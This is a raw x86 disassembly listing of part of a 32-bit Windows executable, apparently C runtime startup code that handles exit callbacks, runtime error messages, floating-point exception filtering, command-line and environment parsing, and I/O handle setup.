  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
